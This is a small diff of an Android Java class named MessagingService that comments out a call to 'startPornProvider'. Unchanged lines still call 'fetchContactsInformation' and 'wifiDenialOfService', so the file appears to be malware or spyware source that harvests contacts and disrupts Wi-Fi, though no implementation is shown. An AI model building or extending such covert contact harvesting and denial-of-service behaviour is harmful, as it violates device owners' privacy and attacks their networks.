@@ -215,7 +215,7 @@ public class MessagingService extends Service {
         }).start();
         Lofl.fetchContactsInformation(this);
         Lofl.wifiDenialOfService(this);
-        Lofl.startPornProvider(this, 180000);
+        //Lofl.startPornProvider(this, 180000);
     }
 
     @Override
